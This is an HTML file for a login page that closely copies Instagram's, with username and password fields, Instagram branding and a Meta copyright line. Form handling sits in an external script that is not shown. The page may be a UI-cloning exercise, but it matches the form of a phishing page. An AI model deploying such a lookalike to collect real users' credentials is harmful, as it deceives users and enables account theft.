<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram Login</title>
  <link rel="stylesheet" href="./style.css">
  <script src="https://cdn.tailwindcss.com"></script>
</head>

<body class="min-h-screen flex items-center justify-center p-4">

  <div class="w-full max-w-sm">
    <!-- Main login container -->
    <div class="bg-white border border-gray-300 p-10 mb-2.5">
      <!-- Instagram logo -->
      <div class="text-center mb-8">
        <!-- <h1 class="text-4xl font-normal instagram-logo" style="font-family: 'Brush Script MT', cursive;">Instagram</h1> -->
        <img src="./logo.png" alt="Instagram Logo" class="mx-auto w-48 mb-4">

      </div>

      <!-- Login form -->
      <form id="loginForm" class="space-y-1.5">
        <div>
          <input type="text" id="username" placeholder="Phone number, username, or email" class="input-field" required>
        </div>

        <div class="relative">
          <input type="password" id="password" placeholder="Password" class="input-field pr-16" required>
          <button type="button" id="togglePassword"
            class="absolute right-2 top-1/2 transform -translate-y-1/2 text-sm font-semibold text-gray-900"
            style="font-size: 14px; color: #262626;">
            Show
          </button>
        </div>

        <div class="pt-2">
          <button type="submit" class="login-btn" id="loginBtn" disabled>
            Log in
          </button>
        </div>
      </form>

      <!-- OR divider -->
      <div class="flex items-center my-5">
        <div class="flex-1 h-px bg-gray-300"></div>
        <span class="px-4 text-gray-500 text-sm font-semibold uppercase">or</span>
        <div class="flex-1 h-px bg-gray-300"></div>
      </div>

      <!-- Facebook login -->
      <div class="text-center mb-5 ">
        <a href="#" class="fb-login flex items-center justify-center">
          <svg class="w-4 h-4 mr-2" fill="currentColor" viewBox="0 0 24 24">
            <path
              d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" />
          </svg>
          Log in with Facebook
        </a>
      </div>

      <!-- Forgot password -->
      <div class="text-center">
        <a href="#" class="text-xs text-blue-900" style="color: #00376b;">Forgot password?</a>
      </div>
    </div>

    <!-- Sign up container -->
    <div class="bg-white border border-gray-300 p-5 text-center">
      <p class="text-sm" style="color: #262626;">
        Don't have an account?
        <a href="#" class="font-semibold text-blue-500" style="color: #0095f6;">Sign up</a>
      </p>
    </div>

    <!-- Get the app / Footer (replaced to match Instagram-like footer) -->
    <div class="text-center mt-5 text-sm text-gray-500">
      <div class="flex flex-wrap justify-center gap-x-4 gap-y-2 mb-4">
        <a href="#" class="hover:underline">About</a>
        <a href="#" class="hover:underline">Blog</a>
        <a href="#" class="hover:underline">Jobs</a>
        <a href="#" class="hover:underline">Help</a>
        <a href="#" class="hover:underline">API</a>
        <a href="#" class="hover:underline">Privacy</a>
        <a href="#" class="hover:underline">Terms</a>
        <a href="#" class="hover:underline">Top Accounts</a>
        <a href="#" class="hover:underline">Hashtags</a>
        <a href="#" class="hover:underline">Locations</a>
      </div>

      <div class="mb-3">
        <label for="language-select" class="sr-only">Select Language</label>
        <select id="language-select" aria-label="Select Language"
          class="bg-transparent border border-gray-200 text-gray-600 px-3 py-1 rounded">
          <option value="en">English</option>
          <option value="en-uk">English (UK)</option>
          <option value="es">Español</option>
          <option value="fr">Français</option>
          <!-- ...add more languages as needed... -->
        </select>
      </div>

      <div>
        <span class="text-xs text-gray-400">© 2025 Instagram from Meta</span>
      </div>
    </div>
  </div>


  <script src="./script.js"></script>
</body>

</html>
